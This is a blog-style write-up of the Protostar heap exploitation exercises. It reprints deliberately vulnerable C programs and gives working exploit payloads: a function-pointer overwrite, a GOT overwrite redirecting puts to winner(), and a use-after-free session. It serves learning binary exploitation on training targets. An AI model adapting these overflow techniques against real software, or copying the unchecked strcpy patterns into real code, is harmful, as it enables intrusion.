---
layout: post
title:  "Protostar Day Three (Heap)"
date:   2020-07-03 12:05:48 +0100
categories: pwn
---

Here is day 3 of the 30 days of pwn journey. Today I will be trying to learn heap exploitation from the protostar challenges found [here](https://exploit-exercises.lains.space/protostar/).

## Heap0
```
#include <stdlib.h>
#include <unistd.h>
#include <string.h>
#include <stdio.h>
#include <sys/types.h>

struct data {
  char name[64];
};

struct fp {
  int (*fp)();
};

void winner()
{
  printf("level passed\n");
}

void nowinner()
{
  printf("level has not been passed\n");
}

int main(int argc, char **argv)
{
  struct data *d;
  struct fp *f;

  d = malloc(sizeof(struct data));
  f = malloc(sizeof(struct fp));
  f->fp = nowinner;

  printf("data is at %p, fp is at %p\n", d, f);

  strcpy(d->name, argv[1]);
  
  f->fp();
}
```
In the first challenge of heap, I will see if what I can attack this the same way as I have been attacking the stack.
```
Starting program: /opt/protostar/bin/heap0 $(python -c "print 'A' * 72")

Program received signal SIGSEGV, Segmentation fault.
0x08048418 in __do_global_dtors_aux ()

Starting program: /opt/protostar/bin/heap0 $(python -c "print 'A' * 76")

Program received signal SIGSEGV, Segmentation fault.
0x41414141 in ?? ()
```
From some light fuzzing it is possible to see that after a buffer size of 72, we are overwriting EIP. Let's now try use this to redirect into the winner() function.

After checking for the entry point, and writing the address into this space after 72 bytes, we see that it has been successful and the challenge is complete.

```
./heap0 $(python -c "print 'A' * 72 + 'd\x84\x04\x08'")
data is at 0x804a008, fp is at 0x804a050
level passed
```

### ExploitCode
```
./heap0 $(python -c "print 'A' * 72 + 'd\x84\x04\x08'")
```

## Heap1
```
#include <stdlib.h>
#include <unistd.h>
#include <string.h>
#include <stdio.h>
#include <sys/types.h>

struct internet {
  int priority;
  char *name;
};

void winner()
{
  printf("and we have a winner @ %d\n", time(NULL));
}

int main(int argc, char **argv)
{
  struct internet *i1, *i2, *i3;

  i1 = malloc(sizeof(struct internet));
  i1->priority = 1;
  i1->name = malloc(8);

  i2 = malloc(sizeof(struct internet));
  i2->priority = 2;
  i2->name = malloc(8);

  strcpy(i1->name, argv[1]);
  strcpy(i2->name, argv[2]);

  printf("and that's a wrap folks!\n");
}
```
In this second challenge, there are 2 arguments we need to pass to the program.

After some light fuzzing, I note that the offset before crashing is 20 bytes in the first argument.
```
(gdb) r $(python -c "print 'A' * 24 + ' BBBB'")
Starting program: /opt/protostar/bin/heap1 $(python -c "print 'A' * 24 + ' BBBB'")

Program received signal SIGSEGV, Segmentation fault.
*__GI_strcpy (dest=0x41414141 <Address 0x41414141 out of bounds>, src=0xbffff99c "BBBB")
    at strcpy.c:40
40	strcpy.c: No such file or directory.
	in strcpy.c
```
Now to find out where in the code we are crashing, we can use `backtrace` to see at which point it crashed.
```
(gdb) backtrace
#0  *__GI_strcpy (dest=0x41414141 <Address 0x41414141 out of bounds>, src=0xbffff99c "BBBB")
    at strcpy.c:40
#1  0x0804855a in main (argc=3, argv=0xbffff844) at heap1/heap1.c:32
```
`0x0804855a` points to the memory location just before puts (or printf in the source code)
```
0x08048555 <main+156>:	call   0x804838c <strcpy@plt>
0x0804855a <main+161>:	movl   $0x804864b,(%esp)
0x08048561 <main+168>:	call   0x80483cc <puts@plt>
```
Now we can find the address that is linked from puts using `disassemble 0x80483cc`
```
Dump of assembler code for function puts@plt:
0x080483cc <puts@plt+0>:	jmp    *0x8049774
0x080483d2 <puts@plt+6>:	push   $0x30
0x080483d7 <puts@plt+11>:	jmp    0x804835c
```
Now we can write in 20 A's and the puts got address.

We see through this that we can control eip with the second argument we pass to it. So after finding the address of the winner() function, we can add that in to complete the challenge.
### ExploitCode
```
import struct

PUTS_GOT = struct.pack("<L",0x8049774)
WINNER = struct.pack("<L",0x08048494)

payload = ""
payload += "A" * 20
payload += PUTS_GOT
payload += " "
payload += WINNER

print(payload)
```

## Heap2
```
#include <stdlib.h>
#include <unistd.h>
#include <string.h>
#include <sys/types.h>
#include <stdio.h>

struct auth {
  char name[32];
  int auth;
};

struct auth *auth;
char *service;

int main(int argc, char **argv)
{
  char line[128];

  while(1) {
    printf("[ auth = %p, service = %p ]\n", auth, service);

    if(fgets(line, sizeof(line), stdin) == NULL) break;
    
    if(strncmp(line, "auth ", 5) == 0) {
      auth = malloc(sizeof(auth));
      memset(auth, 0, sizeof(auth));
      if(strlen(line + 5) < 31) {
        strcpy(auth->name, line + 5);
      }
    }
    if(strncmp(line, "reset", 5) == 0) {
      free(auth);
    }
    if(strncmp(line, "service", 6) == 0) {
      service = strdup(line + 7);
    }
    if(strncmp(line, "login", 5) == 0) {
      if(auth->auth) {
        printf("you have logged in already!\n");
      } else {
        printf("please enter your password\n");
      }
    }
  }
}
```

### ExploitCode
```
[ auth = (nil), service = (nil) ]
auth corn
[ auth = 0x804c008, service = (nil) ]
reset
[ auth = 0x804c008, service = (nil) ]
service AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAa
[ auth = 0x804c008, service = 0x804c018 ]
login
you have logged in already!
[ auth = 0x804c008, service = 0x804c018 ]
```

## Heap3
```
#include <stdlib.h>
#include <unistd.h>
#include <string.h>
#include <sys/types.h>
#include <stdio.h>

void winner()
{
  printf("that wasn't too bad now, was it? @ %d\n", time(NULL));
}

int main(int argc, char **argv)
{
  char *a, *b, *c;

  a = malloc(32);
  b = malloc(32);
  c = malloc(32);

  strcpy(a, argv[1]);
  strcpy(b, argv[2]);
  strcpy(c, argv[3]);

  free(c);
  free(b);
  free(a);

  printf("dynamite failed?\n");
}
```
I think I will leave heap for a small while at least, and move to solidifying knowledge on other parts of pwn. Maybe in future I will do a 30 days of heap (Save me if i do!).